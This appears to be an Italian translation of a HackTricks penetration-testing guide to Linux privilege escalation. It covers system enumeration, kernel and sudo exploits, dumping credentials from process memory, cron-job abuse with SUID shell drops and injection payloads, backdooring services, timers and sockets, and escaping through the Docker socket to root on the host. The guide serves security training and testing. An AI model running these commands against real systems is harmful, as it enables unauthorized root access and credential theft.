# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di sistema

### Informazioni sul sistema operativo

Iniziamo a raccogliere informazioni sul sistema operativo in esecuzione
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Se **hai permessi di scrittura su qualsiasi cartella all'interno della variabile `PATH`** potresti essere in grado di dirottare alcune librerie o binari:
```bash
echo $PATH
```
### Informazioni sull'ambiente

Informazioni interessanti, password o chiavi API nelle variabili d'ambiente?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Controlla la versione del kernel e verifica se esiste qualche exploit che può essere usato per escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Puoi trovare una buona lista di kernel vulnerabili e alcuni già **compiled exploits** qui: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) e [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Altri siti dove puoi trovare alcuni **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Per estrarre tutte le versioni del kernel vulnerabili da quel sito puoi fare:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Strumenti che possono aiutare a cercare kernel exploits sono:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (eseguirlo sul victim, controlla solo exploit per kernel 2.x)

Sempre **cerca la versione del kernel su Google**, magari la tua versione del kernel è indicata in qualche kernel exploit e così sarai sicuro che quell'exploit sia valido.

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Versione di Sudo

Basato sulle versioni di sudo vulnerabili che compaiono in:
```bash
searchsploit sudo
```
Puoi verificare se la versione di sudo è vulnerabile usando questo grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Le versioni di Sudo precedenti a 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) permettono agli utenti locali non privilegiati di elevare i propri privilegi a root tramite l'opzione sudo `--chroot` quando il file `/etc/nsswitch.conf` viene usato da una directory controllata dall'utente.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

Per maggiori informazioni, consulta l'originale [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg verifica della firma fallita

Vedi **smasher2 box of HTB** per un **esempio** di come questa vuln potrebbe essere sfruttata
```bash
dmesg 2>/dev/null | grep "signature"
```
### Ulteriore enumerazione del sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Elencare le possibili difese

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Se sei all'interno di un docker container, puoi provare a evadere da esso:

{{#ref}}
docker-security/
{{#endref}}

## Unità

Controlla **cosa è montato e smontato**, dove e perché. Se qualcosa è smontata, puoi provare a montarla e verificare la presenza di informazioni private.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software utile

Elencare i binari utili
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Controlla anche se **è installato un compilatore**. Questo è utile se hai bisogno di usare qualche kernel exploit, poiché è consigliabile compilarlo sulla macchina in cui lo userai (o in una simile).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software vulnerabile installato

Controlla la **versione dei pacchetti e dei servizi installati**. Potrebbe esserci una vecchia versione di Nagios (per esempio) che potrebbe essere sfruttata per privilege escalation…\
Si consiglia di verificare manualmente la versione del software installato più sospetto.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Se hai accesso SSH alla macchina puoi anche usare **openVAS** per verificare la presenza di software obsoleto o vulnerabile installato sulla macchina.

> [!NOTE] > _Nota che questi comandi mostreranno molte informazioni che saranno per lo più inutili; pertanto è consigliabile utilizzare applicazioni come OpenVAS o simili che verifichino se una versione di software installata è vulnerabile a exploit noti_

## Processi

Dai un'occhiata a **quali processi** sono in esecuzione e verifica se qualche processo ha **più privilegi del dovuto** (magari un tomcat eseguito da root?)
```bash
ps aux
ps -ef
top -n 1
```
Controlla sempre la presenza di [**electron/cef/chromium debuggers** in esecuzione, potresti abusarne per scalare privilegi](electron-cef-chromium-debugger-abuse.md). **Linpeas** li rileva controllando il parametro `--inspect` nella command line del processo.\
Controlla anche i tuoi privilegi sui binari dei processi, magari puoi sovrascriverne qualcuno.

### Process monitoring

Puoi usare strumenti come [**pspy**](https://github.com/DominicBreuker/pspy) per monitorare i processi. Questo può essere molto utile per identificare processi vulnerabili eseguiti frequentemente o quando è soddisfatto un insieme di requisiti.

### Process memory

Alcuni servizi di un server salvano **credenziali in chiaro nella memoria**.\
Normalmente avrai bisogno di **privilegi root** per leggere la memoria di processi appartenenti ad altri utenti, quindi questo è solitamente più utile quando sei già root e vuoi scoprire ulteriori credenziali.\
Tuttavia, ricorda che **come utente normale puoi leggere la memoria dei processi che possiedi**.

> [!WARNING]
> Nota che oggi la maggior parte delle macchine **non consente ptrace di default**, il che significa che non puoi eseguire il dump di processi appartenenti a un utente privo di privilegi.
>
> Il file _**/proc/sys/kernel/yama/ptrace_scope**_ controlla l'accessibilità di ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: tutti i processi possono essere debugged, purché abbiano lo stesso uid. Questo è il comportamento classico di ptrace.
> - **kernel.yama.ptrace_scope = 1**: solo un processo parent può essere debugged.
> - **kernel.yama.ptrace_scope = 2**: solo l'admin può usare ptrace, poiché richiede la capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: nessun processo può essere tracciato con ptrace. Una volta impostato, è necessario un reboot per riabilitare ptrace.

#### GDB

Se hai accesso alla memoria di un servizio FTP (per esempio) potresti ottenere l'Heap e cercare al suo interno le credenziali.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script per GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Per un dato PID, **maps mostrano come la memoria è mappata all'interno dello spazio di indirizzi virtuale di quel processo**; mostrano anche i **permessi di ogni regione mappata**. Il pseudo-file **mem** **espone la memoria stessa del processo**. Dal file **maps** sappiamo quali **regioni di memoria sono leggibili** e i loro offset. Usiamo queste informazioni per **eseguire un seek sul file mem e dumpare tutte le regioni leggibili** in un file.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` fornisce accesso alla memoria **fisica** del sistema, non alla memoria virtuale. Lo spazio degli indirizzi virtuali del kernel è accessibile tramite /dev/kmem.\
Tipicamente, `/dev/mem` è leggibile solo da **root** e dal gruppo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump per linux

ProcDump è una reinterpretazione per Linux del classico strumento ProcDump della suite Sysinternals per Windows. Scaricalo da [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Strumenti

Per dumpare la memoria di un processo puoi usare:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Puoi rimuovere manualmente i requisiti di root e dumpare il processo di tua proprietà
- Script A.5 da [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root è richiesto)

### Credenziali dalla memoria del processo

#### Esempio manuale

Se trovi che il processo authenticator è in esecuzione:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Puoi effettuare il dump del processo (vedi le sezioni precedenti per trovare i diversi modi per effettuare il dump della memoria di un processo) e cercare credentials all'interno della memoria:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Lo strumento [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) ruba **clear text credentials** dalla memoria e da alcuni **file ben noti**. Richiede privilegi di root per funzionare correttamente.

| Funzionalità                                      | Nome processo        |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Regex di ricerca/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Attività pianificate/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Se un pannello web “Crontab UI” (alseambusher/crontab-ui) è in esecuzione come root ed è legato solo al loopback, puoi comunque raggiungerlo tramite SSH local port-forwarding e creare un job privilegiato per ottenere l'escalation.

Catena tipica
- Individuare una porta accessibile solo da loopback (es., 127.0.0.1:8000) e il realm Basic-Auth tramite `ss -ntlp` / `curl -v localhost:8000`
- Trovare credenziali in artefatti operativi:
  - Backup/script con `zip -P <password>`
  - unità systemd che espone `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel e login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Crea un job con privilegi elevati ed eseguilo immediatamente (rilascia una SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Usalo:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Non eseguire Crontab UI come root; limitarne l'uso a un utente dedicato con permessi minimi
- Bind to localhost e restringere ulteriormente l'accesso tramite firewall/VPN; non riutilizzare le password
- Evitare di inserire segreti nei unit files; usare secret stores o EnvironmentFile accessibile solo a root
- Abilitare audit/logging per le esecuzioni di job on-demand

Verifica se qualche scheduled job è vulnerabile. Forse puoi approfittare di uno script eseguito da root (wildcard vuln? puoi modificare file che root usa? usare symlinks? creare file specifici nella directory che root usa?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Percorso Cron

Per esempio, all'interno di _/etc/crontab_ puoi trovare il PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Nota come l'utente "user" abbia privilegi di scrittura su /home/user_)

Se all'interno di questo crontab l'utente root prova ad eseguire qualche comando o script senza impostare il PATH. Ad esempio: _\* \* \* \* root overwrite.sh_\
Quindi, puoi ottenere una shell root usando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron che usa uno script con un wildcard (Wildcard Injection)

Se uno script eseguito da root contiene un “**\***” all'interno di un comando, potresti sfruttarlo per ottenere effetti imprevisti (come privesc). Esempio:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Se il wildcard è preceduto da un percorso come** _**/some/path/\***_ **, non è vulnerabile (neanche** _**./\***_ **lo è).**

Leggi la seguente pagina per altri trucchi di sfruttamento dei wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash esegue parameter expansion e command substitution prima della valutazione aritmetica in ((...)), $((...)) e let. Se un cron/parser eseguito come root legge campi di log non trusted e li passa in un contesto aritmetico, un attaccante può iniettare una command substitution $(...) che viene eseguita come root quando il cron gira.

- Perché funziona: In Bash, le espansioni avvengono in questo ordine: parameter/variable expansion, command substitution, arithmetic expansion, poi word splitting e pathname expansion. Quindi un valore come `$(/bin/bash -c 'id > /tmp/pwn')0` viene prima sostituito (eseguendo il comando), poi il rimanente numerico `0` viene usato per l'aritmetica così lo script continua senza errori.

- Pattern tipico vulnerabile:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Sfruttamento: Fai scrivere nel log testo controllato dall'attaccante in modo che il campo dall'aspetto numerico contenga una command substitution e termini con una cifra. Assicurati che il tuo comando non stampi su stdout (o reindirizzalo) in modo che l'aritmetica rimanga valida.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Se puoi **modificare uno script cron** eseguito come root, puoi ottenere una shell molto facilmente:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Se lo script eseguito da root utilizza una **directory in cui hai pieno accesso**, potrebbe essere utile eliminare quella directory e **creare una symlink che punti a un'altra directory** che contenga uno script controllato da te
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signed cron binaries with writable payloads
Le blue team a volte "sign" i binari eseguiti da cron estraendo una sezione ELF custom e facendo grep per una stringa del vendor prima di eseguirli come root. Se quel binario è scrivibile dal gruppo (es., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) e puoi leak il signing material, puoi forgiare la sezione e dirottare il task cron:

1. Usa `pspy` per catturare il flusso di verifica. In Era, root ha eseguito `objcopy --dump-section .text_sig=text_sig_section.bin monitor` seguito da `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` e poi ha eseguito il file.
2. Ricrea il certificato atteso usando la leaked key/config (da `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Costruisci un replacement malevolo (e.g., drop a SUID bash, add your SSH key) e incorpora il certificato in `.text_sig` in modo che il grep passi:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Sovrascrivi il binario schedulato preservando i bit di esecuzione:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Aspetta la prossima esecuzione cron; una volta che la verifica della firma ingenua ha successo, il tuo payload verrà eseguito come root.

### Frequent cron jobs

Puoi monitorare i processi per cercare quelli eseguiti ogni 1, 2 o 5 minuti. Forse puoi approfittarne e ottenere escalation dei privilegi.

Per esempio, per **monitorare ogni 0.1s per 1 minuto**, **ordinare per comandi meno eseguiti** e cancellare i comandi che sono stati eseguiti più spesso, puoi fare:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Puoi anche usare** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (questo monitorerà e elencherà ogni processo che viene avviato).

### Cronjob invisibili

È possibile creare un cronjob **putting a carriage return after a comment** (without newline character), e il cronjob funzionerà. Esempio (nota il carattere carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servizi

### File _.service_ scrivibili

Controlla se puoi scrivere qualsiasi file `.service`, se puoi, **potresti modificarlo** in modo che **esegua** la tua **backdoor quando** il servizio viene **avviato**, **riavviato** o **fermato** (potrebbe essere necessario aspettare che la macchina venga riavviata).\
Per esempio crea la tua backdoor all'interno del file .service con **`ExecStart=/tmp/script.sh`**

### Service binaries scrivibili

Tieni presente che se hai **permessi di scrittura sui binaries eseguiti dai servizi**, puoi cambiarli per inserire backdoors, così quando i servizi verranno rieseguiti le backdoors saranno eseguite.

### systemd PATH - Percorsi relativi

Puoi vedere il PATH utilizzato da **systemd** con:
```bash
systemctl show-environment
```
Se scopri di poter **scrivere** in una qualunque delle cartelle del percorso, potresti essere in grado di **escalare i privilegi**. Devi cercare **percorsi relativi utilizzati nei file di configurazione dei servizi** come:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Quindi, crea un **executable** con il **same name as the relative path binary** all'interno della systemd PATH folder che puoi scrivere, e quando al service viene chiesto di eseguire l'azione vulnerabile (**Start**, **Stop**, **Reload**), la tua **backdoor will be executed** (gli utenti non privilegiati di solito non possono avviare/fermare i service, ma verifica se puoi usare `sudo -l`).

**Scopri di più sui services con `man systemd.service`.**

## **Timers**

**Timers** sono unit file di systemd il cui nome termina con `**.timer**` e che controllano file o eventi `**.service**`. **Timers** possono essere usati come alternativa a cron poiché hanno supporto integrato per eventi basati sul calendario e per eventi a tempo monotono e possono essere eseguiti in modo asincrono.

Puoi enumerare tutti i timers con:
```bash
systemctl list-timers --all
```
### Timer scrivibili

Se puoi modificare un timer, puoi far sì che esegua alcune unità esistenti di systemd.unit (come una `.service` o una `.target`)
```bash
Unit=backdoor.service
```
Nella documentazione puoi leggere cos'è la Unit:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Pertanto, per abusare di questo permesso dovresti:

- Trovare qualche unità systemd (come una `.service`) che sia **executing a writable binary**
- Trovare qualche unità systemd che sia **executing a relative path** e sulla quale hai **writable privileges** sul **systemd PATH** (per impersonare quell'eseguibile)

**Learn more about timers with `man systemd.timer`.**

### **Abilitare il timer**

Per abilitare un timer sono necessari i privilegi di root ed eseguire:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Nota che il **timer** viene **attivato** creando un symlink a esso in `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Socket

Unix Domain Sockets (UDS) permettono la **comunicazione tra processi** sulla stessa macchina o su macchine diverse all'interno di modelli client-server. Utilizzano i normali file descrittori Unix per la comunicazione inter-computer e vengono configurate tramite file `.socket`.

Sockets can be configured using `.socket` files.

**Scopri di più sui socket con `man systemd.socket`.** All'interno di questo file è possibile configurare diversi parametri interessanti:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Queste opzioni sono differenti ma, in sintesi, vengono usate per **indicare dove ascolterà** il socket (il percorso del file AF_UNIX socket, l'IPv4/6 e/o il numero di porta su cui ascoltare, ecc.)
- `Accept`: Accetta un argomento booleano. Se **true**, viene **avviata un'istanza di service per ogni connessione in arrivo** e solo il socket della connessione le viene passato. Se **false**, tutti i socket in ascolto vengono **passati all'unità di service avviata**, e viene avviata una sola unità di service per tutte le connessioni. Questo valore viene ignorato per datagram sockets e FIFO dove una singola unità di service gestisce incondizionatamente tutto il traffico in ingresso. **Default: false**. Per ragioni di performance, è consigliato scrivere nuovi demoni in modo che siano adatti a `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Accettano una o più righe di comando, che vengono **eseguite prima** o **dopo** che i socket/FIFO in ascolto vengano **creati** e bindati, rispettivamente. Il primo token della riga di comando deve essere un nome di file assoluto, seguito dagli argomenti per il processo.
- `ExecStopPre`, `ExecStopPost`: Comandi aggiuntivi che vengono **eseguiti prima** o **dopo** che i socket/FIFO in ascolto vengano **chiusi** e rimossi, rispettivamente.
- `Service`: Specifica il nome dell'unità di **service** da **attivare** al verificarsi di traffico in ingresso. Questa impostazione è consentita solo per socket con Accept=no. Di default punta al service che ha lo stesso nome del socket (con il suffisso sostituito). Nella maggior parte dei casi non è necessario usare questa opzione.

### Writable .socket files

Se trovi un file `.socket` **scrivibile** puoi **aggiungere** all'inizio della sezione `[Socket]` qualcosa del tipo: `ExecStartPre=/home/kali/sys/backdoor` e la backdoor verrà eseguita prima che il socket venga creato. Perciò **probabilmente dovrai aspettare il reboot della macchina.**\
_Nota che il sistema deve effettivamente usare quella configurazione del file socket o la backdoor non verrà eseguita_

### Writable sockets

Se **identifichi un socket scrivibile** (_ora stiamo parlando di Unix Sockets e non dei file di configurazione `.socket`_), allora **puoi comunicare** con quel socket e magari sfruttare una vulnerabilità.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Connessione raw
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Esempio di exploitation:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Nota che potrebbero esserci alcuni **sockets listening for HTTP** requests (_non sto parlando di .socket files ma dei file che fungono da unix sockets_). Puoi verificarlo con:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Se il socket **risponde a richieste HTTP**, allora puoi **communicate** con esso e magari **exploit some vulnerability**.

### Docker socket scrivibile

Il Docker socket, spesso trovato at `/var/run/docker.sock`, è un file critico che dovrebbe essere protetto. Di default, è writable dall'utente `root` e dai membri del gruppo `docker`. Possedere write access a questo socket può portare a privilege escalation. Ecco una panoramica di come questo possa essere fatto e metodi alternativi se il Docker CLI non è disponibile.

#### **Privilege Escalation with Docker CLI**

Se hai write access al Docker socket, puoi escalate privileges usando i seguenti comandi:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Questi comandi ti permettono di eseguire un container con accesso root al file system dell'host.

#### **Using Docker API Directly**

Nei casi in cui il Docker CLI non è disponibile, il docker socket può comunque essere manipolato usando la Docker API e comandi `curl`.

1.  **List Docker Images:** Recupera la lista delle immagini disponibili.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Invia una richiesta per creare un container che monta la directory root del sistema host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Avvia il container appena creato:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Usa `socat` per stabilire una connessione al container, abilitando l'esecuzione di comandi al suo interno.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Dopo aver impostato la connessione `socat`, puoi eseguire comandi direttamente nel container con accesso root al file system dell'host.

### Others

Nota che se hai permessi di scrittura sul docker socket perché sei **dentro il gruppo `docker`** hai [**più modi per scalare privilegi**](interesting-groups-linux-pe/index.html#docker-group). Se la [**docker API sta ascoltando su una porta** puoi anche essere in grado di comprometterla](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Consulta **altri metodi per evadere da docker o abusarne per scalare privilegi** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Se scopri di poter usare il comando **`ctr`**, leggi la pagina seguente perché **potresti essere in grado di abusarne per scalare privilegi**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Se scopri di poter usare il comando **`runc`**, leggi la pagina seguente perché **potresti essere in grado di abusarne per scalare privilegi**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus è un sofisticato sistema di **inter-Process Communication (IPC)** che permette alle applicazioni di interagire e condividere dati in modo efficiente. Progettato per i sistemi Linux moderni, offre un framework robusto per diverse forme di comunicazione tra applicazioni.

Il sistema è versatile, supportando IPC di base che migliora lo scambio di dati tra processi, ricordando i socket di dominio UNIX migliorati. Inoltre, aiuta nella trasmissione di eventi o segnali, favorendo un'integrazione fluida tra i componenti di sistema. Per esempio, un segnale da un daemon Bluetooth riguardo a una chiamata in arrivo può spingere un lettore musicale a silenziarsi, migliorando l'esperienza utente. Inoltre, D-Bus supporta un sistema di oggetti remoti, semplificando le richieste di servizio e le invocazioni di metodi tra applicazioni, snellendo processi che erano tradizionalmente complessi.

